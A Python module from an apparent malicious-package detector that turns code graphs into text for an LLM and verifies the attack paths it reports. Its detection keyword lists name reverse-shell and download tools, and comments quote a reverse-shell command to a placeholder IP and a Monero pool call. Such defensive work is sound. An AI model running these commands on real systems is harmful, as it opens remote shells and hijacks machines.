# -*- coding: utf-8 -*-
"""图 → LLM 可读摘要（Graph Digest）

背景（2026-11 架构审查）：
当前判定链路是「API 正则匹配 → 用图证明两个命中点连通」——源头仍是
字符串匹配，图只是把匹配结果包装成证据。改法：把整张图序列化成紧凑
文本，让 LLM 自己读图、自己产出链路，从而摆脱 API 名单的粒度限制。

设计约束：
1. **每个节点必须带唯一 ID** —— LLM 只能引用这些 ID，输出可程序化验证
2. **紧凑**：一行一个节点，常量内联截断，按预算裁剪
3. **保语义**：保留调用边/数据边/参数边，控制边折叠（结构噪声）
4. **确定性**：同一图 → 同一文本（可复现，便于缓存与审计）

验证配套见 llm_graph_analyst.verify_paths()。
"""
import re
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple

# 序列化时保留的边类型
# 2026-11 关键区分：污点分析只走数据类边（control 边是控制依赖不是数据依赖，
# taint_engine 排除它是对的——否则 `if flag: os.system('ls')` 会产出假链）。
# 但**给 LLM 读图时 control 边必须保留**：它表达"这段代码在哪个分支里执行"，
# 是理解程序结构的关键（真实样本：恶意 Popen 位于 `if not exists():` 分支内，
# 若隐藏该边，LLM 给出的正确路径会被误判为幻觉）。
# 敌意字面量特征（单节点证据的确定性检查用）
_LITERAL_RISK = (
    '/dev/tcp', 'encodedcommand', 'powershell', 'supportxmr', 'stratum',
    'xmr.', 'pool.', 'bash -i', 'nc -e', 'mkfifo', 'certutil', 'bitsadmin',
    'b64decode', 'unhexlify', 'marshal.loads', 'pickle.loads',
    'reverse_shell', 'wget ', 'curl ', 'chmod ', 'setuid',
)

_DATA_EDGE_KINDS = {'data', 'param', 'return', 'call', 'target'}
_STRUCT_EDGE_KINDS = {'control'}          # 结构/控制边：仅用于 LLM 读图
_ALL_EDGE_KINDS = _DATA_EDGE_KINDS | _STRUCT_EDGE_KINDS
_MAX_CODE_CHARS = 110


def any_hostile_literal(paths: List[Dict], nodes: List[Dict]) -> bool:
    """块划分升级门（2026-11，google_re2 误升级驱动）。

    verify_paths 只保证"边存在"——正则库 re2.compile 的调用链同样是
    真实边，但语义是编译正则不是执行载荷。升级 MALICIOUS 的验证链
    必须至少含一个敌意字面量节点（矿池/反弹 shell/编码命令…）。
    """
    by_id = {n.get('node_id'): (n.get('code') or '')
             for n in nodes if n.get('node_id')}
    from src.literal_decoder import scan_code, decoded_has_risk
    for p in paths or []:
        for nid in p.get('nodes') or []:
            raw = by_id.get(nid) or ''
            code = raw.lower()
            if any(t in code for t in _LITERAL_RISK):
                return True
            # 2026-11 混淆补偿：载荷藏在编码字面量里时，解一层再判
            for hit in scan_code(raw):
                if hit.get('risky') or any(t in hit['decoded'].lower()
                                           for t in _LITERAL_RISK):
                    return True
    return False



def _looks_like_ast_dump(code: str) -> bool:
    """判断节点代码是否是 ast.dump() 的输出而非源码。

    Python 3.8 没有 ast.unparse，DDG builder 的 fallback 会写入
    `Call(func=Attribute(value=Name(id='subprocess',...` 这样的 AST repr。
    LLM 读不懂，关键词匹配也失效（实测 broooxddd：挖矿/reverse-shell
    节点全变成不可读的 AST 文本）。
    """
    return ('Call(func=' in code or 'Name(id=' in code
            or 'Attribute(value=' in code or "Keyword(arg='" in code)


_SOURCE_CACHE: Dict[str, List[str]] = {}


def _source_line(file: str, line: int) -> str:
    """从源文件取第 line 行（1-based），带缓存。"""
    if not file or not line:
        return ''
    lines = _SOURCE_CACHE.get(file)
    if lines is None:
        try:
            with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.read().splitlines()
        except Exception:
            lines = []
        _SOURCE_CACHE[file] = lines
    if 0 < line <= len(lines):
        return lines[line - 1].strip()
    return ''


def _shorten(code: str, limit: int = _MAX_CODE_CHARS) -> str:
    code = ' '.join((code or '').split())
    return code if len(code) <= limit else code[:limit] + '...'


_IOC_RE = {
    'ip_endpoint': re.compile(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?::\d{1,5})?'),
    'url': re.compile(r'https?://[^\s\'"()]{5,90}'),
    'encoded': re.compile(r'[A-Za-z0-9+/]{60,}={0,2}'),
    'miner_pool': re.compile(r'(stratum\+?tcp://[\w.:-]+|pool\.[\w-]+\.(?:com|net|org|io))', re.IGNORECASE),
}


def _extract_iocs(nodes: List[Dict]) -> Dict[str, List[str]]:
    """从节点代码收集攻击基础设施指标（2026-11，缺口1）。

    攻击者的"地址簿"（矿池/反弹 shell IP/载荷 URL/编码字符串）是最硬的
    信号，但散落在各节点截断代码里，LLM 需要自己拼。这里集中提取成表，
    让"基础设施 + 执行点"一眼关联。
    只在 digest 里展示，不影响任何门控逻辑。
    """
    iocs: Dict[str, List[str]] = {}
    for n in nodes:
        code = n.get('code') or ''
        if _looks_like_ast_dump(code):
            code = _source_line(n.get('file', ''), n.get('line', 0)) or code
        low = code.lower()
        for kind, rx in _IOC_RE.items():
            for m in rx.findall(code):
                v = m if isinstance(m, str) else m[0]
                v = v[:90]
                if v not in iocs.setdefault(kind, []):
                    if len(iocs[kind]) < 6:
                        iocs[kind].append(v)
        # 钱包地址特征（XMR 等）：长 base58 常跟在 -u/-o 后
        if ('-u ' in code and 'pool.' in low) or 'supportxmr' in low or 'stratum' in low:
            if 'wallet_address' not in iocs:
                iocs['wallet_address'] = []
    return iocs


def _node_tags(node: Dict, show_danger: bool = False) -> str:
    """节点附加信息。

    show_danger=False（默认）时**只输出客观事实**：
      - resolved_call：AST 解析出的真实调用目标（客观）
    不输出任何"危险判断"：
      - is_dangerous / severity / taint_categories 都来自 pattern_matcher
        的 API 正则，属于**引导性标签**——LLM 看到 «DANGER:critical»
        就会倾向判恶意，那样测的就不是"LLM 读图能力"，而是"LLM 是否
        附议正则"。默认关闭，用于纯 LLM 评估。
    show_danger=True 时保留这些标签（与旧行为一致，供对照实验）。
    """
    tags = []
    if show_danger:
        if node.get('is_dangerous'):
            sev = node.get('severity')
            tags.append('DANGER' + (f':{sev}' if sev and sev != 'safe' else ''))
        if node.get('sink_expansion'):
            tags.append('sink-expanded')
        cats = node.get('taint_categories') or []
        if cats:
            tags.append('/'.join(cats[:2]))
    resolved = node.get('resolved_call')
    if resolved:
        tags.append(f'->{resolved}')
    return ('  <<' + '|'.join(tags) + '>>') if tags else ''


def _node_type(node: Dict) -> str:
    """节点语句类型（call/assign/return/if/for/function/import/…）。

    LLM 读图时这是最高价值的一列：`assign` vs `call` vs `return` 决定
    它在链里扮演什么角色（产生值 / 触发副作用 / 传递值）。
    """
    t = node.get('type') or ''
    if not t:
        code = (node.get('code') or '').lstrip()
        if code.startswith(('import ', 'from ')):
            return 'import'
        if code.startswith(('def ', 'async def ')):
            return 'function'
        if code.startswith(('class ',)):
            return 'class'
        if code.startswith(('return ',)):
            return 'return'
        if code.startswith(('if ', 'elif ')):
            return 'if'
        if code.startswith(('for ', 'while ')):
            return 'loop'
        if code.startswith(('try', 'except', 'finally', 'with ')):
            return 'block'
        if '=' in code and not code.startswith(('==', '!=')):
            return 'assign'
        return 'expr'
    return str(t)[:10]


def _graph_distances(nodes: List[Dict], edges: List[Dict],
                     anchors: Set[str]) -> Dict[str, int]:
    """计算每个节点到最近 anchor 的无向图距离（BFS）。

    2026-11：用于**排序**而非裁剪。跨函数/跨文件的数据流是本项目的核心
    优势，切片会切断 param/return 边，因此绝不丢节点——只让"离敏感操作
    近"的节点优先进入预算。距离是纯结构指标，不含任何恶意判断。
    """
    if not anchors:
        return {}
    adj: Dict[str, Set[str]] = {}
    for e in edges:
        a, b = e.get('from_node'), e.get('to_node')
        if a and b:
            adj.setdefault(a, set()).add(b)
            adj.setdefault(b, set()).add(a)
    dist: Dict[str, int] = {}
    frontier = [a for a in anchors if a]
    for a in frontier:
        dist[a] = 0
    d = 0
    while frontier:
        d += 1
        nxt = []
        for cur in frontier:
            for nb in adj.get(cur, ()):
                if nb not in dist:
                    dist[nb] = d
                    nxt.append(nb)
        frontier = nxt
    return dist


def digest(nodes: List[Dict], edges: List[Dict],
           max_nodes: int = 700, max_edges: int = 1200,
           max_chars: int = 0, show_danger: bool = False,
           priority_nodes: Set[str] = None,
           boundary_edges: Dict = None):
    """把图序列化为 LLM 可读文本，并返回短 ID 映射。

    2026-11 改进：节点使用**短 ID**（N1/N2/…）而非全路径 ID。
    全路径 ID（`_disk2_..._setup.py_8_4`）有两个问题：占 token、
    LLM 抄写时极易出错导致验证失败。短 ID 由本函数分配并返回映射表，
    验证时再映射回真实 node_id。

    Args:
        boundary_edges: 可选，跨块边 {'in': [rec...], 'out': [rec...]}。
            分块分析时块内边被诱导子图切断，这里单独呈现"数据从哪进来、
            去哪了"，让 LLM 不把跨函数链的起点当成孤立节点。

    Returns:
        (text, short_to_real) — short_to_real: {'N1': '<real node_id>'}
    """
    node_by_id = {n.get('node_id'): n for n in nodes if n.get('node_id')}

    # 节点排序：有危险标记/有 resolved_call 的优先，其次按文件+行号
    def _rank(n: Dict) -> Tuple[int, str, int]:
        prio = 0
        if n.get('is_dangerous'):
            prio -= 2
        if n.get('resolved_call'):
            prio -= 1
        return (prio, n.get('file', ''), n.get('line', 0))

    # 2026-11 预算自适应：大包（a2a_sdk 5466 节点）固定 700 节点会产生
    # 11 万字符的 digest，外部截断会把 EDGES 段整个切掉 → LLM 看不到边 →
    # 输出无效。这里按字符预算反推节点/边数量，并给边预留 ~35% 空间。
    if max_chars:
        edge_reserve = int(max_chars * 0.35)
        node_budget = max(40, (max_chars - edge_reserve) // 90)  # 每节点约 90 字符
        max_nodes = min(max_nodes, node_budget)
        max_edges = min(max_edges, max(30, edge_reserve // 45))

    # 预算裁剪策略：
    #   show_danger=True  → 按"危险优先"选（正则命中先进入视野）
    #   show_danger=False → 按文件+行号均匀选（无偏见，用于纯 LLM 评估）
    # 后者很重要：若大包裁剪时优先保留正则命中的节点，LLM 看到的样本
    # 本身就是被正则筛过的，测出来的"独立判断能力"是假的。
    # 预算内的节点选择策略（不丢图，只决定"谁先进入 LLM 视野"）：
    #   1. priority_nodes 给出时 → 按【到这些锚点的图距离】排序。
    #      跨函数/跨文件的节点只要在数据流路径上，距离就小，会被优先保留
    #      ——这正是本项目的核心优势，绝不能因为预算被裁掉。
    #   2. show_danger=True → 按危险标记排序（对照实验用）
    #   3. 否则 → 文件+行号均匀采样（无偏基线）
    _dist = _graph_distances(nodes, edges, priority_nodes) if priority_nodes else {}

    if _dist:
        _ordered_all = sorted(
            nodes,
            key=lambda n: (_dist.get(n.get('node_id'), 10 ** 6),
                           n.get('file', ''), n.get('line', 0)))
        _selected = _ordered_all[:max_nodes]
    elif show_danger:
        _selected = sorted(nodes, key=_rank)[:max_nodes]
    else:
        _ordered_all = sorted(nodes, key=lambda n: (n.get('file', ''), n.get('line', 0)))
        if len(_ordered_all) > max_nodes:
            step = len(_ordered_all) / float(max_nodes)
            _selected = [_ordered_all[int(i * step)] for i in range(max_nodes)]
        else:
            _selected = _ordered_all
    ordered = sorted(_selected, key=lambda n: (n.get('file', ''), n.get('line', 0)))

    # 分配短 ID —— **编号顺序与图结构无关**（2026-11 真实失败驱动）
    # 早期按输出顺序编号（N1,N2,N3…）诱导弱模型偷懒：它看到编号连续，
    # 直接把 N1→N2→…→N219 串成"路径"，完全不看 EDGES（ably 实测）。
    # 改用 node_id 的内容哈希排序编号：相邻编号之间**没有任何结构含义**，
    # 模型必须真的读边的列表。哈希保证确定性（同图同编号）。
    import hashlib

    def _stable_key(nid: str) -> str:
        return hashlib.md5(str(nid).encode('utf-8')).hexdigest()

    short_to_real: Dict[str, str] = {}
    real_to_short: Dict[str, str] = {}
    id_order = sorted([n.get('node_id') for n in ordered if n.get('node_id')],
                      key=_stable_key)
    for i, real in enumerate(id_order, 1):
        short = f'N{i}'
        short_to_real[short] = real
        real_to_short[real] = short
    keep_ids = set(real_to_short)

    # 边：数据边与结构边分开收集（结构边只给 LLM 看，不进污点分析）
    kept_edges = []
    struct_edges = []
    for e in edges:
        kind = e.get('kind') or e.get('edge_kind') or 'data'
        if kind not in _ALL_EDGE_KINDS:
            continue
        a, b = e.get('from_node'), e.get('to_node')
        if not (a in keep_ids and b in keep_ids):
            continue
        cross = bool(e.get('is_cross_file'))
        item = (real_to_short[a], real_to_short[b], kind,
                e.get('variable') or '', cross)
        if kind in _STRUCT_EDGE_KINDS:
            struct_edges.append(item)
        else:
            kept_edges.append(item)
        if len(kept_edges) + len(struct_edges) >= max_edges:
            break

    # 按文件分组输出节点（含类型、所属函数/类、严重度）
    lines = ['## NODES  (format: <ID> [type] L<line> <code>  {function})']
    cur_file = None
    for n in ordered:
        real = n.get('node_id')
        if not real:
            continue
        f = n.get('file', '?')
        if f != cur_file:
            cur_file = f
            lines.append(f'# file: {f}')
            # 文件级统计：让 LLM 一眼看出包结构与规模
            _f_nodes = [x for x in ordered if x.get('file') == f]
            _f_funcs = {x.get('function_name') for x in _f_nodes if x.get('function_name')}
            lines.append(f'#   {len(_f_nodes)} nodes, {len(_f_funcs)} functions')
        fn = n.get('function_name')
        cls = n.get('class_name')
        scope = ''
        if fn:
            scope = f'  {{{cls + "." if cls else ""}{fn}}}'
        _code = n.get('code', '') or ''
        if _looks_like_ast_dump(_code):
            # Python 3.8 的 ast.dump 回退 → 改用源码行（可读、可关键词匹配）
            _fixed = _source_line(n.get('file', ''), n.get('line', 0))
            if _fixed:
                _code = _fixed
        lines.append(f'{real_to_short[real]}  [{_node_type(n)}]  L{n.get("line", 0)}  '
                     f'{_shorten(_code)}{scope}{_node_tags(n, show_danger)}')

    lines.append('')
    lines.append('## EDGES  (format: A -kind[var]-> B, [X] = cross-file)  [data flow]')
    for a, b, kind, var, cross in kept_edges:
        var_note = f'[{var}]' if var else ''
        cross_note = ' [X]' if cross else ''
        lines.append(f'{a} -{kind}{var_note}-> {b}{cross_note}')

    lines.append('')
    lines.append('## STRUCT-EDGES  (control/structure: A -kind-> B)  '
                 '[execution context, not data flow]')
    for a, b, kind, var, cross in struct_edges:
        var_note = f'  [{var}]' if var else ''
        lines.append(f'{a} -{kind}-> {b}{var_note}')

    # ===== 函数边界汇总（2026-11 信息增强）=====
    # LLM 需要知道"这段代码属于哪个函数、在哪一层执行"：
    # module 级代码在 import/安装时执行（最危险），函数级要等调用。
    lines.append('')
    lines.append('## FUNCTIONS  (scope map: name | file | line range | node count)')
    _funcs: Dict[tuple, Dict] = {}
    for n in ordered:
        real = n.get('node_id')
        if not real:
            continue
        key = (n.get('file', '?'), n.get('class_name') or '',
               n.get('function_name') or '<module>')
        slot = _funcs.setdefault(key, {'lines': [], 'short': []})
        ln = n.get('line', 0)
        if ln:
            slot['lines'].append(ln)
        slot['short'].append(real_to_short[real])
    for (f, cls, fn), slot in sorted(
            _funcs.items(), key=lambda kv: (kv[0][0], min(kv[1]['lines'] or [0]))):
        lo = min(slot['lines']) if slot['lines'] else 0
        hi = max(slot['lines']) if slot['lines'] else 0
        name = f'{cls}.{fn}' if cls else fn
        scope_note = '  [MODULE-LEVEL: runs on import/install]' if fn == '<module>' else ''
        shown = ','.join(slot['short'][:8]) + ('...' if len(slot['short']) > 8 else '')
        lines.append(f'{name} | {f} | L{lo}-{hi} | {len(slot["short"])} nodes '
                     f'({shown}){scope_note}')

    # ===== 跨作用域数据流（攻击拆分的典型形态）=====
    # 读函数返回 → 执行函数消费：payload 被拆到多个函数/文件时，
    # 显式列出跨界流动，LLM 不必自己从节点列表里推断。
    lines.append('')
    lines.append('## CROSS-SCOPE FLOWS  (data crossing function/file boundaries)')
    _scope_of = {}
    for n in ordered:
        real = n.get('node_id')
        if not real:
            continue
        _scope_of[real_to_short[real]] = (
            n.get('file', '?'),
            (n.get('class_name') or '') + ('.' if n.get('class_name') else '')
            + (n.get('function_name') or '<module>'))
    _seen_flow = set()
    for a, b, kind, var, cross in kept_edges:
        sa, sb = _scope_of.get(a), _scope_of.get(b)
        if not sa or not sb or sa == sb:
            continue
        sig = (sa, sb, var)
        if sig in _seen_flow:
            continue
        _seen_flow.add(sig)
        var_note = f'  [{var}]' if var else ''
        lines.append(f'{sa[1]} ({sa[0]})  =>  {sb[1]} ({sb[0]}){var_note}  via {a}->{b}')
    if not _seen_flow:
        lines.append('(none - all data stays within a single function)')

    # ===== 跨块边（2026-11 划分越界修复）=====
    # 分块分析时块内边是诱导子图，跨函数/跨文件的边不在里面。这里单独
    # 呈现：数据从哪个函数进来、本函数的结果又被谁消费。没有这一段，
    # 跨函数链的起点会被模型当成"参数来源未知"，只能给 SUSPICIOUS。
    if boundary_edges:
        lines.append('')
        lines.append('## BOUNDARY EDGES  '
                     '(data crossing THIS block\'s boundary)')
        _b_lines = 0
        for rec in (boundary_edges.get('in') or [])[:8]:
            var_note = f"  [{rec['variable']}]" if rec.get('variable') else ''
            lines.append(
                f"IN   {rec.get('from_func', '?')} "
                f"[{rec.get('from_file', '?')}:{rec.get('from_line', 0)}]  "
                f"--{rec.get('kind', 'data')}{var_note}-->  [THIS BLOCK]")
            _b_lines += 1
        for rec in (boundary_edges.get('out') or [])[:8]:
            var_note = f"  [{rec['variable']}]" if rec.get('variable') else ''
            lines.append(
                f"OUT  [THIS BLOCK]  --{rec.get('kind', 'data')}{var_note}-->  "
                f"{rec.get('to_func', '?')} "
                f"[{rec.get('to_file', '?')}:{rec.get('to_line', 0)}]")
            _b_lines += 1
        if not _b_lines:
            lines.append('(none)')

    # ===== 孤立载荷节点（2026-11，单节点证据驱动）=====
    # 真实形态：恶意 payload 直接写在调用里，没有"数据从哪来"的链：
    #     subprocess.Popen("bash -i >& /dev/tcp/1.2.3.4/7777 <&1")
    #     subprocess.Popen(["...krot", "-o", "pool.supportxmr.com:443"])
    # 这类节点在数据流图里天然孤立，模型容易视而不见或硬连一条假链
    # （被验证器拒绝后整条路径作废）。做法：显式列出，明确告知无需上游。
    _LITERAL_RISK = (
        '/dev/tcp', 'encodedcommand', 'powershell', 'supportxmr', 'stratum',
        'xmr', 'bash -i', 'nc -e', 'mkfifo', 'certutil', 'bitsadmin',
        'curl ', 'wget ', 'base64', 'b64decode', 'chmod ', 'setuid',
        'urllib', 'requests.post', 'os.system', 'subprocess.popen',
    )
    in_deg = set()
    out_deg = set()
    for item in kept_edges + struct_edges:
        a, b = item[0], item[1]
        out_deg.add(a)
        in_deg.add(b)

    _by_short = {}
    for n in ordered:
        real = n.get('node_id')
        if real:
            _by_short[real_to_short[real]] = n

    isolated = []
    for sid, n in _by_short.items():
        if sid in in_deg or sid in out_deg:
            continue
        code = (n.get('code') or '')
        if _looks_like_ast_dump(code):
            code = _source_line(n.get('file', ''), n.get('line', 0)) or code
        low = code.lower()
        if any(p in low for p in _LITERAL_RISK):
            isolated.append((sid, code))

    if isolated:
        lines.append('')
        lines.append('## ISOLATED PAYLOAD NODES  (no upstream data flow — '
                     'the literal argument IS the attack)')
        for sid, code in isolated[:8]:
            lines.append(f'{sid}  {_shorten(code, 140)}')
        lines.append('For these nodes report a SINGLE-NODE path '
                     '(see the hard-coded payload rule).')

    # ===== 攻击基础设施表（2026-11 缺口1：IOC 全局视图）=====
    # 矿池/反弹 shell IP/载荷 URL/编码串散落在各节点截断代码里；
    # 集中成表让模型把"基础设施 + 执行点"一眼关联。
    iocs = _extract_iocs(_selected)

    # 2026-11 单层自动解码（混淆盲区）：把编码字面量解开一层，
    # 解出的内容既进 IOC 扫描也单独展示——quarejma-botnet 那类
    # "载荷全在 base64 里"的包，不解码就等于没看见。
    decoded_hits = []
    try:
        from src.literal_decoder import scan_code, decoded_has_risk
        for n in _selected:
            code = n.get('code') or ''
            if _looks_like_ast_dump(code):
                code = _source_line(n.get('file', ''), n.get('line', 0)) or code
            for hit in scan_code(code):
                hit['file'] = n.get('file', '')
                hit['line'] = n.get('line', 0)
                hit['risky'] = decoded_has_risk(hit['decoded'])
                decoded_hits.append(hit)
                if len(decoded_hits) >= 8:
                    break
            if len(decoded_hits) >= 8:
                break
    except Exception:
        decoded_hits = []

    if any(v for v in iocs.values() if v) or decoded_hits:
        lines.append('')
        lines.append('## SUSPICIOUS LITERALS  (endpoints / payloads found in code)')
        _ioc_label = {'ip_endpoint': 'IP:endpoint', 'url': 'URL',
                      'encoded': 'encoded-blob', 'miner_pool': 'miner-pool',
                      'wallet_address': 'wallet-context'}
        for kind, vals in iocs.items():
            if not vals:
                continue
            lines.append(f'  {_ioc_label.get(kind, kind)}: ' + ' | '.join(vals[:6]))
        for h in decoded_hits:
            flag = '  <<HOSTILE CONTENT>>' if h['risky'] else ''
            lines.append(f"  decoded-{h['method']}: "
                         f"{h['decoded'][:110]!r}{flag}"
                         f"   (from {Path(h['file']).name}:{h['line']})")
        lines.append('If a LITERAL above appears near an execution sink, '
                     'name it explicitly in why_malicious.')

    lines.append('')
    lines.append(f'## STATS  nodes={len(short_to_real)}/{len(nodes)}  '
                 f'data_edges={len(kept_edges)}  '
                 f'struct_edges={len(struct_edges)}/{len(edges)}')
    return '\n'.join(lines), short_to_real


def verify_paths(paths: List[Dict], nodes: List[Dict], edges: List[Dict],
                 short_to_real: Dict[str, str] = None) -> Tuple[List[Dict], List[Dict]]:
    """校验 LLM 产出的路径是否对应图中真实存在的节点与边。

    防幻觉的核心：LLM 只能引用 Digest 里出现过的 ID，且相邻两节点之间
    必须真的存在一条（保留类型内的）边。任一步不成立 → 整条路径作废。

    2026-11 两点放宽（真实样本驱动）：
      1. 短 ID 映射：LLM 看到的是 N1/N2，验证时映射回真实 node_id
      2. **同语句放行**：同一文件同一行的两个节点视为可连（语句内部的
         属性访问/参数关系 DDG 不一定建边，但语义上属于同一步）。
         否则 LLM 正确的路径（Popen → CREATE_NO_WINDOW 同一行）会被误拒。

    Returns:
        (valid_paths, rejected) — rejected 里带 reason，便于审计与调参。
        valid_paths 中的 nodes 已映射回**真实 node_id**。
    """
    s2r = short_to_real or {}

    def _real(x: str) -> str:
        return s2r.get(x, x)

    node_by_id = {n.get('node_id'): n for n in nodes if n.get('node_id')}
    # 验证只关心"边是否真实存在"，不限制类型——LLM 描述的是执行路径，
    # 允许经过 control 边（如"在 if 分支里执行"）。防幻觉看的是存在性。
    edge_set = set()
    for e in edges:
        kind = e.get('kind') or e.get('edge_kind') or 'data'
        if kind in _ALL_EDGE_KINDS:
            a, b = e.get('from_node'), e.get('to_node')
            if a and b:
                edge_set.add((a, b))

    def _same_stmt(a: str, b: str) -> bool:
        na, nb = node_by_id.get(a), node_by_id.get(b)
        if not na or not nb:
            return False
        return (na.get('file') == nb.get('file')
                and na.get('line') == nb.get('line')
                and na.get('line') not in (0, None))

    valid, rejected = [], []
    for p in paths or []:
        # ===== 单节点证据（2026-11，反弹 shell 驱动）=====
        # 有些恶意是「自证」的，不需要数据流：
        #   os.system("bash -i >& /dev/tcp/1.2.3.4/7777 <&1")
        #   exec("...硬编码 payload...")
        # 这类调用没有 source，污点链天然不成立。允许 len==1 的路径，
        # 但要求模型在 why_malicious 里说明「为什么这个节点自身即攻击」，
        # 且节点必须真实存在——保持可审计。
        if (isinstance(p.get('nodes'), list) and len(p['nodes']) == 1
                and (p.get('why_malicious') or '').strip()):
            only = p['nodes'][0]
            real = s2r.get(only, only)
            if real not in node_by_id:
                rejected.append({'path': p, 'reason': f'hallucinated_nodes:{[only]}'})
                continue
            # 2026-11 硬化（良性 500 驱动）：单节点指控必须通过**确定性
            # 敌意特征检查**。实测 __version__ = "0.5.0"（单行良性包）
            # 被模型幻觉性指控为 MALICIOUS——单节点豁免了边验证，
            # 必须用敌意字面量特征兜底，否则任何节点都能被单点判死。
            node_code = node_by_id[real].get('code') or ''
            if _looks_like_ast_dump(node_code):
                node_code = _source_line(node_by_id[real].get('file', ''),
                                         node_by_id[real].get('line', 0)) or node_code
            hostile = any(p_ in node_code.lower() for p_ in _LITERAL_RISK)
            if not hostile:
                rejected.append({'path': p,
                                 'reason': 'single_node_without_hostile_literal'})
                continue
            single = dict(p)
            single['nodes'] = [real]
            single['llm_nodes'] = [only]
            single['partial'] = False
            single['single_node'] = True
            valid.append(single)
            continue

        # 2026-11：支持模型直接输出**边序列**（比节点序列更严格）。
        # edges: [["A","B","data"], ["B","C","param"]]
        # 好处：模型必须逐跳说明走的是哪条边，跳步会在声明阶段就暴露。
        raw_edges = p.get('edges')
        if isinstance(raw_edges, list) and raw_edges:
            ids = []
            for hop in raw_edges:
                if not isinstance(hop, (list, tuple)) or len(hop) < 2:
                    ids = []
                    break
                a, b = str(hop[0]), str(hop[1])
                if not ids:
                    ids.append(a)
                if ids[-1] != a:
                    ids = []      # 边序列不连续
                    break
                ids.append(b)
            if not ids:
                rejected.append({'path': p, 'reason': 'malformed_edge_sequence'})
                continue
        else:
            ids = p.get('nodes') or p.get('path') or []
        if not isinstance(ids, list) or len(ids) < 2:
            rejected.append({'path': p, 'reason': 'path_too_short'})
            continue
        real_ids = [_real(i) for i in ids]
        missing = [i for i in real_ids if i not in node_by_id]
        if missing:
            rejected.append({'path': p, 'reason': f'hallucinated_nodes:{missing[:3]}'})
            continue
        # 逐步验证，同时记录最长有效前缀（2026-11 真实失败驱动）
        # 弱模型常给出"前面对、最后一步错"的路径（ramtool: 4 步全对，
        # 末步多走了不存在的边）。整条丢弃会损失真实证据；接受**有效前缀**
        # 并标记 partial，既保留证据又不在结构上放水。
        prefix_len = 0
        broken = []
        for i in range(len(real_ids) - 1):
            a, b = real_ids[i], real_ids[i + 1]
            if (a, b) in edge_set or (b, a) in edge_set or _same_stmt(a, b):
                prefix_len += 1
            else:
                broken.append(f'{ids[i]}→{ids[i+1]}')
        total_steps = len(real_ids) - 1

        if not broken:
            normalized = dict(p)
            normalized['nodes'] = real_ids       # 回写真实 ID
            normalized['llm_nodes'] = ids        # 保留 LLM 原始输出，便于审计
            normalized['partial'] = False
            valid.append(normalized)
            continue

        # 有效前缀足够长（≥2 步且覆盖 ≥50%）→ 作为 partial 证据保留
        if prefix_len >= 2 and prefix_len >= total_steps * 0.5:
            normalized = dict(p)
            normalized['nodes'] = real_ids[:prefix_len + 1]
            normalized['llm_nodes'] = ids
            normalized['partial'] = True
            normalized['dropped_steps'] = broken[:3]
            valid.append(normalized)
            continue

        rejected.append({'path': p, 'reason': f'nonexistent_edges:{broken[:3]}'})
    return valid, rejected
